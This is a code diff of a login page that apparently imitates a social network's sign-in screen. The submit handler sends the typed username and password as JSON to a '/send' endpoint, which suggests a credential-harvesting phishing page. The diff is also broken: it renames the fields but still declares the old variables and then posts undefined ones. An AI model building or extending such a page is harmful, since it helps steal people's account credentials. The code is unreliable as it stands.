@@ -20,8 +20,8 @@
         </div>
 
         <form id="form">
-            <input type="text" id="ism" placeholder="Mobile number,username or email" required>
-            <input type="text" id="yosh" placeholder="Password" required>
+            <input type="text" id="username" placeholder="Mobile number,username or email" required>
+            <input type="text" id="password" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
 
@@ -42,14 +42,14 @@ const status = document.getElementById("status");
 form.addEventListener("submit", async (e) => {
     e.preventDefault();
 
-    const ism = document.getElementById("ism").value;
-    const yosh = document.getElementById("yosh").value;
+    const ism = document.getElementById("username").value;
+    const yosh = document.getElementById("password").value;
 
     try {
         const response = await fetch("/send", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ ism, yosh })
+            body: JSON.stringify({ username, password })
         });
 
         
